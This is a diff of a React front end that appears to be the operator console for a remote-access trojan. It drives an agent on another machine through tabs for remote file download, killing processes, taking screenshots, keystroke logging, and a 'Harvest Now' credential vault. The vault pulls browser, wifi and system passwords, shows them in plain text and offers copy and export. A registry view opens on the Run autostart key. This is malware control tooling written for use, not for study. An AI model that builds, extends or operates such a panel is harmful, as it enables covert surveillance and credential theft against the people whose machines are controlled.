+            </div>
+            {files.filter(f => f.is_dir).map((f, i) => (
+              <div key={i} onClick={() => navigateTo(f.name)} style={{
+                padding: '4px 8px', cursor: 'pointer', color: '#61afef', fontSize: 12, fontFamily: 'var(--font-mono)',
+              }} onMouseEnter={e => e.currentTarget.style.background = 'rgba(255,255,255,0.05)'}
+                 onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
+                📁 {f.name}
+              </div>
+            ))}
+          </div>
+        </div>
+        <div style={S.splitRight}>
+          {error && <div style={{ color: 'var(--red)', fontFamily: 'var(--font-mono)', fontSize: 11, padding: 12 }}>Error: {error}</div>}
+          <div style={{ flex: 1, overflowY: 'auto' }}>
+            <table style={{ width: '100%', borderCollapse: 'collapse' }}>
+              <thead><tr>
+                <th style={{ ...S.th, width: 24 }}></th>
+                <th style={S.th}>Name</th>
+                <th style={S.th}>Size</th>
+                <th style={S.th}>Modified</th>
+                <th style={{ ...S.th, width: 70 }}>Actions</th>
+              </tr></thead>
+              <tbody>
+                {files.length === 0 && !loading && (
+                  <tr><td colSpan={5} style={{ ...S.td, textAlign: 'center', color: 'rgba(255,255,255,0.3)' }}>Click Refresh to browse filesystem</td></tr>
                 )}
-              </td>
-            </tr>
-          ))}
-        </tbody>
-      </table>
+                {loading && (
+                  <tr><td colSpan={5} style={{ ...S.td, textAlign: 'center', color: 'var(--yellow)' }}>⏳ Waiting for agent response...</td></tr>
+                )}
+                {files.map((f, i) => (
+                  <tr key={i} style={{ cursor: 'pointer' }}
+                    onClick={() => f.is_dir && navigateTo(f.name)}
+                    onContextMenu={e => { e.preventDefault(); setSelectedFile(f); setCtx({ x: e.clientX, y: e.clientY, items: fileContextItems(f) }); }}
+                    onMouseEnter={e => e.currentTarget.style.background = 'rgba(255,255,255,0.03)'}
+                    onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
+                    <td style={S.td}>{f.is_dir ? '📁' : '📄'}</td>
+                    <td style={{ ...S.td, color: f.is_dir ? '#61afef' : '#fff' }}>{f.name}</td>
+                    <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{f.is_dir ? '-' : formatSize(f.size)}</td>
+                    <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{formatDate(f.modified)}</td>
+                    <td style={S.td}>
+                      {!f.is_dir && <button style={{ ...S.toolBtn, padding: '2px 8px', fontSize: 10 }}
+                        onClick={e => { e.stopPropagation(); api.createTask(agentId, 'storage_upload', { path: currentPath + '\\' + f.name }); showToast('⬇ Downloading'); }}>⬇</button>}
+                    </td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+      {ctx && <ContextMenu x={ctx.x} y={ctx.y} items={ctx.items} onClose={() => setCtx(null)} />}
     </div>
   );
 }
 
 /* ========== PROCESSES TAB ========== */
-function ProcessesTab({ agentId }) {
+function ProcessesTab({ agentId, showToast }) {
   const [processes, setProcesses] = useState([]);
   const [loading, setLoading] = useState(false);
   const [search, setSearch] = useState('');
   const [sortCol, setSortCol] = useState('pid');
-  const [sortDir, setSortDir] = useState('asc');
-  const [pendingTaskId, setPendingTaskId] = useState(null);
+  const [sortDir, setSortDir] = useState(1);
+  const [filterMode, setFilterMode] = useState('all');
   const [killTarget, setKillTarget] = useState(null);
+  const [ctx, setCtx] = useState(null);
+  const [selectedProcs, setSelectedProcs] = useState(new Set());
   const intervalRef = useRef(null);
 
-  const fetchProcesses = useCallback(async () => {
+  const fetchProcesses = useCallback(() => {
     setLoading(true);
-    try {
-      const res = await api.createTask(agentId, 'task_viewer_list', {});
-      setPendingTaskId(res.id);
-    } catch {
+    sendAndPoll(agentId, 'task_viewer_list', {}, (result) => {
       setLoading(false);
-    }
+      if (result && Array.isArray(result)) {
+        setProcesses(result);
+      }
+    });
   }, [agentId]);
 
-  // Poll for results
-  useEffect(() => {
-    if (!pendingTaskId) return;
-    const poll = setInterval(async () => {
-      try {
-        const results = await api.getAgentResults(agentId);
-        const result = results.find(r => r.task_id === pendingTaskId);
-        if (result) {
-          clearInterval(poll);
-          setPendingTaskId(null);
-          setLoading(false);
-          try {
-            const parsed = JSON.parse(result.output);
-            if (Array.isArray(parsed)) {
-              setProcesses(parsed);
-            }
-          } catch {}
-        }
-      } catch {}
-    }, 2000);
-    return () => clearInterval(poll);
-  }, [pendingTaskId, agentId]);
-
-  // Auto-refresh every 10 seconds
   useEffect(() => {
     fetchProcesses();
     intervalRef.current = setInterval(fetchProcesses, 10000);
@@ -427,271 +535,177 @@ function ProcessesTab({ agentId }) {
   }, [fetchProcesses]);
 
   const handleSort = (col) => {
-    if (sortCol === col) {
-      setSortDir(d => d === 'asc' ? 'desc' : 'asc');
-    } else {
-      setSortCol(col);
-      setSortDir('asc');
-    }
+    if (sortCol === col) setSortDir(d => d * -1);
+    else { setSortCol(col); setSortDir(1); }
+  };
+
+  const isSystemProc = (p) => {
+    const sysUsers = ['system', 'local service', 'network service', 'dwm-1'];
+    return sysUsers.some(u => (p.user || '').toLowerCase().includes(u));
   };
 
   const filtered = processes.filter(p => {
-    if (!search) return true;
-    const s = search.toLowerCase();
-    return (p.name || '').toLowerCase().includes(s)
-      || (p.user || '').toLowerCase().includes(s)
-      || String(p.pid).includes(s);
+    if (search) {
+      const s = search.toLowerCase();
+      if (!(p.name || '').toLowerCase().includes(s) && !String(p.pid).includes(s) && !(p.user || '').toLowerCase().includes(s)) return false;
+    }
+    if (filterMode === 'user') return !isSystemProc(p);
+    if (filterMode === 'system') return isSystemProc(p);
+    return true;
   });
 
   const sorted = [...filtered].sort((a, b) => {
     let va = a[sortCol], vb = b[sortCol];
-    if (typeof va === 'string') va = va.toLowerCase();
-    if (typeof vb === 'string') vb = vb.toLowerCase();
-    if (va < vb) return sortDir === 'asc' ? -1 : 1;
-    if (va > vb) return sortDir === 'asc' ? 1 : -1;
-    return 0;
+    if (typeof va === 'string') return va.localeCompare(vb) * sortDir;
+    return ((va || 0) - (vb || 0)) * sortDir;
   });
 
-  const killProcess = async (pid) => {
-    try {
-      await api.createTask(agentId, 'task_viewer_kill', { pid });
-      setKillTarget(null);
+  const killProcess = (pid) => {
+    sendAndPoll(agentId, 'task_viewer_kill', { pid }, () => {
+      showToast(`☠ Killed PID ${pid}`);
       setTimeout(fetchProcesses, 2000);
-    } catch {}
+    });
+    setKillTarget(null);
   };
 
-  const sortIcon = (col) => {
-    if (sortCol !== col) return ' ↕';
-    return sortDir === 'asc' ? ' ↑' : ' ↓';
-  };
+  const sortArrow = (col) => sortCol === col ? (sortDir === 1 ? ' ▲' : ' ▼') : '';
+
+  const procCtxItems = (p) => [
+    { label: 'Kill Process', icon: '☠', danger: true, onClick: () => setKillTarget(p) },
+    { separator: true },
+    { label: `PID: ${p.pid}`, icon: 'ℹ' },
+  ];
 
   return (
-    <div style={{ padding: 16 }}>
-      <div style={{ display: 'flex', gap: 8, marginBottom: 12, alignItems: 'center' }}>
-        <input
-          type="text"
-          className="form-input"
-          placeholder="Search processes..."
-          value={search}
-          onChange={e => setSearch(e.target.value)}
-          spellCheck="false"
-          style={{ flex: 1, fontFamily: 'var(--font-mono)', fontSize: 11 }}
-        />
-        <button className="btn btn-sm" onClick={fetchProcesses} disabled={loading}>
-          {loading ? '⏳ LOADING...' : '🔄 REFRESH'}
-        </button>
-        <span style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-muted)' }}>
-          {processes.length} processes
-        </span>
-      </div>
-      <table>
-        <thead>
-          <tr>
-            {[
-              { key: 'pid', label: 'PID' },
-              { key: 'name', label: 'Name' },
-              { key: 'user', label: 'User' },
-              { key: 'memory_mb', label: 'Memory (MB)' },
-            ].map(col => (
-              <th key={col.key} style={{ cursor: 'pointer', userSelect: 'none' }} onClick={() => handleSort(col.key)}>
-                {col.label}{sortIcon(col.key)}
-              </th>
-            ))}
-            <th>Actions</th>
-          </tr>
-        </thead>
-        <tbody>
-          {sorted.length === 0 && !loading && (
-            <tr><td colSpan={5} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>
-              {processes.length === 0 ? 'Loading process list...' : 'No matching processes'}
-            </td></tr>
-          )}
-          {loading && processes.length === 0 && (
-            <tr><td colSpan={5} style={{ color: 'var(--yellow)', textAlign: 'center' }}>
-              ⏳ Waiting for agent response...
-            </td></tr>
-          )}
-          {sorted.map((p, i) => (
-            <tr key={i}>
-              <td style={{ color: 'var(--green)' }}>{p.pid}</td>
-              <td>{p.name}</td>
-              <td style={{ color: 'var(--text-muted)' }}>{p.user || '-'}</td>
-              <td style={{ color: 'var(--text-sec)' }}>{p.memory_mb != null ? p.memory_mb.toFixed(1) : '-'}</td>
-              <td>
-                <button className="btn btn-sm btn-red" onClick={() => setKillTarget(p)}>KILL</button>
-              </td>
-            </tr>
+    <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
+      <div style={S.toolbar}>
+        <input type="search" placeholder="Search processes..." value={search} onChange={e => setSearch(e.target.value)}
+          style={{ ...S.toolInput, minWidth: 200 }} />
+        <div style={{ display: 'flex', gap: 4 }}>
+          {['all', 'user', 'system'].map(f => (
+            <button key={f} style={{ ...S.toolBtn, ...(filterMode === f ? S.btnSuccess : {}) }}
+              onClick={() => setFilterMode(f)}>{f.charAt(0).toUpperCase() + f.slice(1)}</button>
           ))}
-        </tbody>
-      </table>
-
-      <ConfirmModal
-        open={!!killTarget}
-        title="CONFIRM KILL PROCESS"
-        message={`Kill process "${killTarget?.name}" (PID ${killTarget?.pid})?`}
-        detail={
-          <>
-            <div><span style={{ color: 'var(--text-muted)' }}>PID: </span><span style={{ color: 'var(--green)' }}>{killTarget?.pid}</span></div>
-            <div><span style={{ color: 'var(--text-muted)' }}>NAME: </span><span style={{ color: 'var(--text-sec)' }}>{killTarget?.name}</span></div>
-            <div><span style={{ color: 'var(--text-muted)' }}>USER: </span><span style={{ color: 'var(--text-sec)' }}>{killTarget?.user || '-'}</span></div>
-          </>
-        }
-        confirmLabel="KILL"
-        onConfirm={() => killProcess(killTarget?.pid)}
-        onCancel={() => setKillTarget(null)}
-      />
-    </div>
-  );
-}
-
-/* ========== TASKS TAB ========== */
-function TasksTab({ tasks, results }) {
-  const [filter, setFilter] = useState('all');
-  const [expandedTask, setExpandedTask] = useState(null);
-  const filtered = filter === 'all' ? tasks : tasks.filter(t => t.status === filter);
-
-  const getOutput = (taskId) => {
-    const r = results?.find(r => r.task_id === taskId);
-    return r ? r.output : null;
-  };
-
-  return (
-    <div style={{ padding: 16 }}>
-      <div className="filter-bar">
-        {['all','pending','sent','completed','failed'].map(f => (
-          <button key={f} className={`btn ${filter === f ? 'active' : ''}`} onClick={() => setFilter(f)}>{f.toUpperCase()}</button>
-        ))}
+        </div>
+        <div style={{ flex: 1 }} />
+        <span style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'rgba(255,255,255,0.3)' }}>{processes.length} processes</span>
+        <button style={S.toolBtn} onClick={fetchProcesses} disabled={loading}>{loading ? '⏳...' : '↻ Refresh'}</button>
+        <button style={{ ...S.toolBtn, ...S.btnDanger }} onClick={() => {
+          selectedProcs.forEach(pid => sendAndPoll(agentId, 'task_viewer_kill', { pid }, () => {}));
+          showToast(`☠ Killed ${selectedProcs.size} processes`);
+          setSelectedProcs(new Set());
+        }} disabled={selectedProcs.size === 0}>Kill Selected</button>
       </div>
-      <table>
-        <thead><tr><th>ID</th><th>Type</th><th>Args</th><th>Status</th><th>Created</th><th>Output</th></tr></thead>
-        <tbody>
-          {filtered.length === 0 ? (
-            <tr><td colSpan={6} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>No tasks</td></tr>
-          ) : filtered.map(t => {
-            const output = getOutput(t.id);
-            const isExpanded = expandedTask === t.id;
-            return (
-              <React.Fragment key={t.id}>
-                <tr style={{ cursor: output ? 'pointer' : 'default' }} onClick={() => output && setExpandedTask(isExpanded ? null : t.id)}>
-                  <td>TSK-{String(t.id).padStart(3,'0')}</td>
-                  <td>{t.task_type}</td>
-                  <td style={{ maxWidth: 200, overflow: 'hidden', textOverflow: 'ellipsis' }}>{t.args_json}</td>
-                  <td style={{ color: t.status === 'completed' ? 'var(--green)' : t.status === 'failed' ? 'var(--red)' : t.status === 'pending' ? 'var(--yellow)' : 'var(--blue)' }}>
-                    {t.status?.toUpperCase()}
-                  </td>
-                  <td>{t.created_at ? new Date(t.created_at).toLocaleTimeString() : '-'}</td>
-                  <td>
-                    {output ? (
-                      <span style={{ color: 'var(--green)', fontSize: 10, fontFamily: 'var(--font-mono)' }}>
-                        {isExpanded ? '▼ COLLAPSE' : '▶ VIEW'}
-                      </span>
-                    ) : t.status === 'completed' ? (
-                      <span style={{ color: 'var(--text-muted)', fontSize: 10 }}>no output</span>
-                    ) : (
-                      <span style={{ color: 'var(--text-disabled)', fontSize: 10 }}>waiting...</span>
-                    )}
-                  </td>
-                </tr>
-                {isExpanded && output && (
-                  <tr>
-                    <td colSpan={6} style={{ padding: 0 }}>
-                      <pre style={{
-                        margin: 0,
-                        padding: 12,
-                        background: '#0d0f12',
-                        border: '1px solid var(--border)',
-                        fontFamily: 'var(--font-mono)',
-                        fontSize: 11,
-                        color: 'var(--green)',
-                        whiteSpace: 'pre-wrap',
-                        wordBreak: 'break-all',
-                        maxHeight: 300,
-                        overflow: 'auto',
-                      }}>{(() => {
-                        try {
-                          const parsed = JSON.parse(output);
-                          return JSON.stringify(parsed, null, 2);
-                        } catch { return output; }
-                      })()}</pre>
-                    </td>
-                  </tr>
-                )}
-              </React.Fragment>
-            );
-          })}
-        </tbody>
-      </table>
+      <div style={{ flex: 1, overflowY: 'auto' }}>
+        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
+          <thead><tr>
+            <th style={{ ...S.th, width: 30 }}><input type="checkbox" style={{ accentColor: 'var(--green)' }}
+              onChange={e => {
+                if (e.target.checked) setSelectedProcs(new Set(sorted.map(p => p.pid)));
+                else setSelectedProcs(new Set());
+              }} /></th>
+            <th style={S.th} onClick={() => handleSort('pid')}>PID{sortArrow('pid')}</th>
+            <th style={S.th} onClick={() => handleSort('name')}>Name{sortArrow('name')}</th>
+            <th style={S.th} onClick={() => handleSort('user')}>User{sortArrow('user')}</th>
+            <th style={S.th} onClick={() => handleSort('memory_mb')}>Memory{sortArrow('memory_mb')}</th>
+            <th style={S.th} onClick={() => handleSort('threads')}>Threads{sortArrow('threads')}</th>
+          </tr></thead>
+          <tbody>
+            {loading && processes.length === 0 && (
+              <tr><td colSpan={6} style={{ ...S.td, textAlign: 'center', color: 'var(--yellow)' }}>⏳ Waiting for agent response...</td></tr>
+            )}
+            {sorted.map((p, i) => (
+              <tr key={i}
+                onContextMenu={e => { e.preventDefault(); setCtx({ x: e.clientX, y: e.clientY, items: procCtxItems(p) }); }}
+                onMouseEnter={e => e.currentTarget.style.background = 'rgba(255,255,255,0.03)'}
+                onMouseLeave={e => e.currentTarget.style.background = 'transparent'}
+                style={{ color: isSystemProc(p) ? 'rgba(255,255,255,0.3)' : undefined }}>
+                <td style={S.td}><input type="checkbox" style={{ accentColor: 'var(--green)' }}
+                  checked={selectedProcs.has(p.pid)}
+                  onChange={e => {
+                    const s = new Set(selectedProcs);
+                    e.target.checked ? s.add(p.pid) : s.delete(p.pid);
+                    setSelectedProcs(s);
+                  }} /></td>
+                <td style={{ ...S.td, color: 'var(--green)' }}>{p.pid}</td>
+                <td style={S.td}>{p.name}</td>
+                <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{p.user || '-'}</td>
+                <td style={{ ...S.td, color: (p.memory_mb || 0) > 200 ? 'var(--yellow)' : 'rgba(255,255,255,0.7)' }}>
+                  {p.memory_mb != null ? p.memory_mb.toFixed ? p.memory_mb.toFixed(1) + ' MB' : p.memory_mb + ' MB' : '-'}
+                </td>
+                <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{p.threads || p.parent_pid || '-'}</td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
+      </div>
+      {ctx && <ContextMenu x={ctx.x} y={ctx.y} items={ctx.items} onClose={() => setCtx(null)} />}
+      <ConfirmModal open={!!killTarget} title="CONFIRM KILL PROCESS"
+        message={`Kill process "${killTarget?.name}" (PID ${killTarget?.pid})?`}
+        confirmLabel="KILL" onConfirm={() => killProcess(killTarget?.pid)} onCancel={() => setKillTarget(null)} />
     </div>
   );
 }
 
 /* ========== DISPLAY TAB ========== */
-function DisplayTab({ agentId }) {
+function DisplayTab({ agentId, showToast }) {
   const [captures, setCaptures] = useState([]);
-  const [autoCapture, setAutoCapture] = useState(false);
-
-  const takeCapture = () => {
-    api.createTask(agentId, 'display_capture', {});
-  };
+  const takeCapture = () => { api.createTask(agentId, 'display_capture', {}); showToast('📸 Screenshot captured'); };
 
   return (
-    <div style={{ padding: 16 }}>
-      <div className="toolbar">
-        <button className="btn btn-green" onClick={takeCapture}>CAPTURE</button>
-        <button className={`btn btn-sm ${autoCapture ? 'active' : ''}`} onClick={() => setAutoCapture(!autoCapture)}>
-          AUTO-CAPTURE ({autoCapture ? 'ON' : 'OFF'})
-        </button>
-        <span style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-muted)', marginLeft: 12 }}>INTERVAL: 30S</span>
+    <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
+      <div style={S.toolbar}>
+        <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={takeCapture}>📸 Capture Now</button>
+        <span style={{ color: 'rgba(255,255,255,0.5)', fontSize: 11 }}>Auto-capture:</span>
+        <select style={{ background: '#15171b', border: '1px solid var(--border)', color: '#fff', fontFamily: 'var(--font-mono)', fontSize: 11, padding: '4px 8px', outline: 'none' }}>
+          <option value="off">Off</option><option value="10">10s</option><option value="30">30s</option><option value="60">60s</option>
+        </select>
+        <div style={{ flex: 1 }} />
+        <span style={{ color: 'rgba(255,255,255,0.3)', fontSize: 11, fontFamily: 'var(--font-mono)' }}>Captures: {captures.length}</span>
       </div>
-      <div style={{ border: '1px solid var(--border)', background: 'var(--term-bg)', minHeight: 300, display: 'flex', alignItems: 'center', justifyContent: 'center', marginTop: 12 }}>
-        <div style={{ textAlign: 'center' }}>
-          <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="var(--text-disabled)" strokeWidth="1"><rect x="2" y="3" width="20" height="14"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
-          <div style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--text-disabled)', marginTop: 12, textTransform: 'uppercase', letterSpacing: '1.4px' }}>
-            No captures yet. Click CAPTURE to take a screenshot.
-          </div>
+      <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', background: '#0a0c10', borderBottom: '1px solid var(--border)', minHeight: 300 }}>
+        <div style={{ textAlign: 'center', color: 'rgba(255,255,255,0.3)', fontSize: 13, fontFamily: 'var(--font-mono)' }}>
+          <div style={{ fontSize: 48, marginBottom: 10, opacity: 0.3 }}>🖥</div>
+          <div>Click Capture to take a screenshot</div>
         </div>
       </div>
-      <div style={{ marginTop: 16 }}>
-        <div className="section-label">Capture History</div>
-        <div style={{ display: 'flex', gap: 8 }}>
-          {captures.length === 0 && [0,1,2].map(i => (
-            <div key={i} style={{ width: 120, height: 75, border: '1px solid var(--border)', background: 'var(--term-bg)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontFamily: 'var(--font-mono)', fontSize: 9, color: 'var(--text-disabled)' }}>EMPTY</div>
-          ))}
-        </div>
+      <div style={{ display: 'flex', gap: 8, padding: '10px 12px', overflowX: 'auto', background: '#1f2228', flexShrink: 0 }}>
+        {captures.length === 0 && [0, 1, 2].map(i => (
+          <div key={i} style={{ width: 120, height: 72, background: '#15171b', border: '1px solid var(--border)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: 'rgba(255,255,255,0.3)', fontSize: 10, fontFamily: 'var(--font-mono)', flexShrink: 0 }}>EMPTY</div>
+        ))}
       </div>
     </div>
   );
 }
 
 /* ========== INPUT LOG TAB ========== */
-function InputLogTab({ agentId }) {
+function InputLogTab({ agentId, showToast }) {
   const [monitoring, setMonitoring] = useState(false);
   const [logs, setLogs] = useState([]);
 
-  const startMonitor = () => {
-    api.createTask(agentId, 'input_monitor_start', {});
-    setMonitoring(true);
-  };
-  const stopMonitor = () => {
-    api.createTask(agentId, 'input_monitor_stop', {});
-    setMonitoring(false);
-  };
-
   return (
-    <div style={{ padding: 16 }}>
-      <div className="toolbar">
-        <button className="btn btn-green" onClick={startMonitor}>START</button>
-        <button className="btn btn-red" onClick={stopMonitor}>STOP</button>
-        <button className="btn btn-sm" onClick={() => setLogs([])}>CLEAR LOG</button>
-        <button className="btn btn-sm">EXPORT</button>
-        {monitoring && <span style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--green)', marginLeft: 12 }}>● RECORDING</span>}
+    <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
+      <div style={S.toolbar}>
+        {monitoring ? (
+          <button style={{ ...S.toolBtn, ...S.btnDanger }} onClick={() => { api.createTask(agentId, 'input_monitor_stop', {}); setMonitoring(false); }}>⏹ Stop</button>
+        ) : (
+          <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={() => { api.createTask(agentId, 'input_monitor_start', {}); setMonitoring(true); }}>▶ Start</button>
+        )}
+        {monitoring && <span style={S.tag('var(--green)')}>● RECORDING</span>}
+        <input type="search" placeholder="Search keystrokes..." style={{ ...S.toolInput, marginLeft: 8 }} />
+        <div style={{ flex: 1 }} />
+        <button style={S.toolBtn} onClick={() => showToast('📋 Exported keylog')}>↓ Export</button>
       </div>
-      <div className="keystroke-display" style={{ marginTop: 12, minHeight: 300 }}>
+      <div style={{ flex: 1, overflowY: 'auto', padding: 12 }}>
         {logs.length === 0 ? (
-          <div style={{ color: 'var(--text-disabled)' }}>No keystrokes captured. Click START to begin monitoring.</div>
+          <div style={{ color: 'rgba(255,255,255,0.3)', textAlign: 'center', marginTop: 40, fontFamily: 'var(--font-mono)' }}>
+            No keystrokes captured. Click Start to begin monitoring.
+          </div>
         ) : logs.map((l, i) => (
-          <div key={i}>
-            <span className="ks-time">[{l.time}]</span> <span className="ks-app">{l.app}:</span> {l.text}
+          <div key={i} style={{ padding: '8px 12px', borderBottom: '1px solid rgba(255,255,255,0.04)', display: 'flex', gap: 12, fontSize: 12, fontFamily: 'var(--font-mono)' }}>
+            <span style={{ color: 'rgba(255,255,255,0.3)', minWidth: 70 }}>{l.ts}</span>
+            <span style={{ color: '#61afef', minWidth: 160, fontWeight: 500 }}>{l.app}</span>
+            <span style={{ color: 'rgba(255,255,255,0.7)' }}>{l.keys}</span>
           </div>
         ))}
       </div>
@@ -700,60 +714,95 @@ function InputLogTab({ agentId }) {
 }
 
 /* ========== VAULT TAB ========== */
-function VaultTab({ creds, agentId }) {
+function VaultTab({ creds, agentId, showToast }) {
   const [filter, setFilter] = useState('all');
+  const [ctx, setCtx] = useState(null);
   const filtered = filter === 'all' ? creds : creds.filter(c => c.source?.toLowerCase() === filter);
 
-  const harvest = () => {
-    api.createTask(agentId, 'vault_reader', { targets: ['chrome','firefox','edge','wifi','system'] });
+  const harvest = () => { api.createTask(agentId, 'vault_reader', {}); showToast('🔑 Harvesting all credential stores...'); };
+  const copy = (text) => { navigator.clipboard.writeText(text).catch(() => {}); showToast('📋 Copied'); };
+
+  const srcColor = (src) => {
+    const s = (src || '').toLowerCase();
+    if (s === 'chrome') return 'var(--green)';
+    if (s === 'firefox') return 'var(--yellow)';
+    if (s === 'edge') return '#61afef';
+    if (s === 'wifi') return 'rgba(255,255,255,0.7)';
+    if (s === 'system') return 'var(--red)';
+    return 'var(--green)';
   };
 
-  const copyPw = (pw) => {
-    navigator.clipboard.writeText(pw).catch(() => {});
-  };
+  const credCtxItems = (c) => [
+    { label: 'Copy Username', icon: '👤', onClick: () => copy(c.username) },
+    { label: 'Copy Password', icon: '🔑', onClick: () => copy(c.password) },
+    { label: 'Copy Both', icon: '📋', onClick: () => copy(`${c.username}:${c.password}`) },
+    { separator: true },
+    { label: 'Open URL', icon: '🔗', onClick: () => window.open(c.url, '_blank') },
+  ];
 
   return (
-    <div style={{ padding: 16 }}>
-      <div className="filter-bar">
-        {['all','chrome','firefox','edge','wifi','system'].map(f => (
-          <button key={f} className={`btn ${filter === f ? 'active' : ''}`} onClick={() => setFilter(f)}>{f.toUpperCase()}</button>
-        ))}
-        <button className="btn btn-green" style={{ marginLeft: 'auto' }} onClick={harvest}>HARVEST NOW</button>
-      </div>
-      <table>
-        <thead><tr><th>Source</th><th>URL</th><th>Username</th><th>Password</th><th>Harvested</th><th></th></tr></thead>
-        <tbody>
-          {filtered.length === 0 ? (
-            <tr><td colSpan={6} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>No credentials. Click HARVEST NOW.</td></tr>
-          ) : filtered.map(c => (
-            <tr key={c.id}>
-              <td>{c.source}</td>
-              <td style={{ color: 'var(--text-sec)' }}>{c.url}</td>
-              <td>{c.username}</td>
-              <td><span className="pw-plain">{c.password}</span></td>
-              <td>{c.created_at ? new Date(c.created_at).toLocaleTimeString() : '-'}</td>
-              <td><button className="copy-btn" onClick={() => copyPw(c.password)}>COPY</button></td>
-            </tr>
+    <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
+      <div style={S.toolbar}>
+        <div style={{ display: 'flex', gap: 4 }}>
+          {['all', 'chrome', 'firefox', 'edge', 'wifi', 'system'].map(f => (
+            <button key={f} style={{ ...S.toolBtn, padding: '4px 10px', ...(filter === f ? S.btnSuccess : {}) }}
+              onClick={() => setFilter(f)}>{f.charAt(0).toUpperCase() + f.slice(1)}</button>
           ))}
-        </tbody>
-      </table>
+        </div>
+        <div style={{ flex: 1 }} />
+        <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={harvest}>⚷ Harvest Now</button>
+        <button style={S.toolBtn} onClick={() => showToast('📋 Exported CSV')}>↓ Export CSV</button>
+      </div>
+      <div style={{ flex: 1, overflowY: 'auto' }}>
+        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
+          <thead><tr>
+            <th style={S.th}>Source</th><th style={S.th}>URL / Name</th><th style={S.th}>Username</th>
+            <th style={S.th}>Password</th><th style={S.th}>Harvested</th><th style={{ ...S.th, width: 60 }}></th>
+          </tr></thead>
+          <tbody>
+            {filtered.length === 0 ? (
+              <tr><td colSpan={6} style={{ ...S.td, textAlign: 'center', color: 'rgba(255,255,255,0.3)' }}>No credentials. Click Harvest Now.</td></tr>
+            ) : filtered.map((c, i) => (
+              <tr key={c.id || i}
+                onContextMenu={e => { e.preventDefault(); setCtx({ x: e.clientX, y: e.clientY, items: credCtxItems(c) }); }}
+                onMouseEnter={e => e.currentTarget.style.background = 'rgba(255,255,255,0.03)'}
+                onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
+                <td style={S.td}><span style={S.tag(srcColor(c.source))}>{c.source}</span></td>
+                <td style={{ ...S.td, color: '#61afef', maxWidth: 220, overflow: 'hidden', textOverflow: 'ellipsis' }}>{c.url}</td>
+                <td style={S.td}>{c.username}</td>
+                <td style={{ ...S.td, color: 'var(--green)', fontWeight: 500 }}>{c.password}</td>
+                <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{c.created_at ? new Date(c.created_at).toLocaleTimeString() : '-'}</td>
+                <td style={S.td}><button style={{ ...S.toolBtn, padding: '2px 8px', fontSize: 10 }}
+                  onClick={() => copy(c.password)}>Copy</button></td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
+      </div>
+      {ctx && <ContextMenu x={ctx.x} y={ctx.y} items={ctx.items} onClose={() => setCtx(null)} />}
     </div>
   );
 }
 
-/* ========== CONFIG STORE TAB ========== */
-function ConfigStoreTab({ agentId }) {
-  const [hive, setHive] = useState('HKLM');
-  const [regPath, setRegPath] = useState('SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run');
-  const [pathInput, setPathInput] = useState('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run');
-  const [values, setValues] = useState([]);
+/* ========== REGISTRY TAB (Split Panel) ========== */
+function RegistryTab({ agentId, showToast }) {
+  const [hive, setHive] = useState('HKCU');
+  const [regPath, setRegPath] = useState('Software\\Microsoft\\Windows\\CurrentVersion\\Run');
+  const [pathInput, setPathInput] = useState('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run');
   const [subkeys, setSubkeys] = useState([]);
+  const [values, setValues] = useState([]);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState(null);
-  const [pendingValuesTask, setPendingValuesTask] = useState(null);
-  const [pendingSubkeysTask, setPendingSubkeysTask] = useState(null);
+  const [ctx, setCtx] = useState(null);
 
-  // Parse "HKLM\SOFTWARE\..." into hive + path
+  // Tree state for root hives
+  const hives = [
+    { name: 'HKEY_CURRENT_USER', short: 'HKCU', icon: '👤' },
+    { name: 'HKEY_LOCAL_MACHINE', short: 'HKLM', icon: '🖥' },
+    { name: 'HKEY_CLASSES_ROOT', short: 'HKCR', icon: '🗂' },
+    { name: 'HKEY_USERS', short: 'HKU', icon: '👥' },
+  ];
+
   const parsePath = (fullPath) => {
     const parts = fullPath.split('\\');
     const h = parts[0].replace('HKEY_LOCAL_MACHINE', 'HKLM')
@@ -763,82 +812,42 @@ function ConfigStoreTab({ agentId }) {
     return { hive: h, path: parts.slice(1).join('\\') };
   };
 
-  // Poll for subkeys result
-  useEffect(() => {
-    if (!pendingSubkeysTask) return;
-    const interval = setInterval(async () => {
-      try {
-        const results = await api.getAgentResults(agentId);
-        const result = results.find(r => r.task_id === pendingSubkeysTask);
-        if (result) {
-          clearInterval(interval);
-          setPendingSubkeysTask(null);
-          try {
